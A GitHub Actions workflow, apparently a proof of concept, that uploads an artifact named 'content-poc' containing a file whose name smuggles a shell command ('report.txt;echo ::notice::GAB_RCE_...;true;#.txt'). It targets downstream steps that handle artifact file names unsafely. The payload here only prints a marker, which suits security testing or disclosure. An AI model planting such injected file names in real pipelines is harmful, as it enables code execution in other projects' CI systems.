name: Test

on:
  pull_request:

jobs:
  upload:
    runs-on: ubuntu-latest
    steps:
      - name: build artifact
        run: |
          set -e
          mkdir -p content
          printf 'hello\n' > content/report.txt
          printf 'x\n' > "content/report.txt;echo ::notice::GAB_RCE_$(id -un)_$(date +%s);true;#.txt"
      - uses: actions/upload-artifact@v4
        with:
          name: content-poc
          path: content/
